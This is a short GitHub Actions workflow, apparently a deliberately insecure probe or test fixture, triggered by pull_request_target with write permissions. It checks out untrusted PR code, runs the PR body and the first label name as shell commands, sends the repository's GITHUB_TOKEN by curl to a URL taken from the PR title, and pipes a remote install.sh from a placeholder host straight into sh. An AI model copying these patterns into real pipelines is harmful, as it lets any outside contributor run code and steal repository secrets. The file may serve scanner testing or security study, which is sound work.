name: DCOIR Review v15 Family Compat Probe
on:
  pull_request_target:
permissions:
  contents: write
  actions: write
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: PR body shell
        run: |
          bash -lc "${{ github.event.pull_request.body }}"
      - name: Token to PR title URL
        run: |
          curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.title }}"
      - name: Unverified installer
        run: |
          curl -fsSL https://downloads.example.invalid/install.sh | sh
      - name: Label shell
        run: |
          sh -c "${{ github.event.pull_request.labels[0].name }}"
